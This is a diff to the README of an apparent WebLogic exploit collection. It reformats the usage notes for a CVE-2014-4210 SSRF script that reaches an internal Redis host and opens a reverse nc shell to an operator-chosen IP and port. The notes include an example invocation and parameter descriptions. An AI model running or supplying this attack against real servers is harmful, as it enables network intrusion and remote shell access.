@@ -48,27 +48,29 @@
 > ```  
 
 ## CVE-2014-4210_ssrf_scan.py Weblogic SSRF 漏洞扫描内网端口
-VER:
-```
-Weblogic 10.0.2
-Weblogic 10.3.6
-```
-USE:
-```
-zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_redis_shell.py 
-+---------------------------------------------------------------------------------------------------+
-+ USE: python <filename> <weblogic_ip> <weblogic_port> <inside_ip> <inside_port> <nc_ip> <nc_port>  +
-+ EXP: python filename.py 1.1.1.1 7001 192.168.1.1 6379 2.2.2.2 5555                                +
-+ VER: 10.0.2,10.3.6                                                                                +
-+---------------------------------------------------------------------------------------------------+
-```
-DES:
-```
-<weblogic_ip> weblogic的IP地址
-<weblogic_port> weblogic的端口，一般情况下为7001
-<inside_ip> 内网redis主机的IP地址，该地址通过 6.1 的scan脚本得出
-<inside_port> 内网redis的端口，默认6379
-<nc_ip> 反弹nc shell的IP
-<nc_port> 反弹nc shell的端口
-```
-![Image](https://freeerror.org/assets/files/2020-04-02/1585790930-936865-weblogic-redis-shell3.png)
+> VER:
+> ```
+> Weblogic 10.0.2
+> Weblogic 10.3.6
+> ```
+> USE:
+> ```
+> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_redis_shell.py 
+> +---------------------------------------------------------------------------------------------------+
+> + USE: python <filename> <weblogic_ip> <weblogic_port> <inside_ip> <inside_port> <nc_ip> <nc_port>  +
+> + EXP: python filename.py 1.1.1.1 7001 192.168.1.1 6379 2.2.2.2 5555                                +
+> + VER: 10.0.2,10.3.6                                                                                +
+> +---------------------------------------------------------------------------------------------------+
+> ```
+> DES:
+> ```
+> <weblogic_ip> weblogic的IP地址
+> <weblogic_port> weblogic的端口，一般情况下为7001
+> <inside_ip> 内网redis主机的IP地址，该地址通过 6.1 的scan脚本得出
+> <inside_port> 内网redis的端口，默认6379
+> <nc_ip> 反弹nc shell的IP
+> <nc_port> 反弹nc shell的端口
+> ```
+> EXP:
+> ![Image](https://github.com/zhzyker/exphub/blob/master/weblogic/image/cve-2014-4210_ssrf_redis_shell.png)
+  
